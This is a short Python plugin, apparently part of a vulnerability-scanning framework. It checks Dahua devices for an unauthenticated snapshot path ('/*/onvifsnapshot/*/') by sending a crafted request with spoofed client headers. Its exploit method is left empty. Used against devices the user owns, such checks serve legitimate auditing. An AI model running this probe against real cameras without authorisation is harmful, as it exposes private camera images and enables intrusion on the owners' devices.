import requests

from loguru import logger

from .base import POCTemplate


class DahuaUnauth02(POCTemplate):

    def __init__(self, config):
        super().__init__(config)
        self.name = self.get_file_name(__file__)
        self.product = config.product['dahua']
        self.product_version = ''
        self.ref = ''
        self.level = POCTemplate.level.high
        self.desc = """"""
        self.headers = {
            'Connection': 'close',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Accept': '*/*',
            'X-Requestd-With': 'XMLHttpRequest',
            'X-Request': 'JSON',
            'User-Agent': 'DAHUA-dhdev/1.0',
        }

    def verify(self, ip, port=80):
        url = f"http://{ip}:{port}/*/onvifsnapshot/*/"
        try:
            r = requests.get(url, headers=self.headers, timeout=self.config.timeout, verify=False)
            if r.status_code == 200 and ('<title>' in r.text) and ('404' not in r.text):
                return ip, str(port), self.product, '', '', self.name
        except Exception as e:
            logger.error(e)
        return None

    def exploit(self, results):
        pass


POCTemplate.register_poc(DahuaUnauth02)
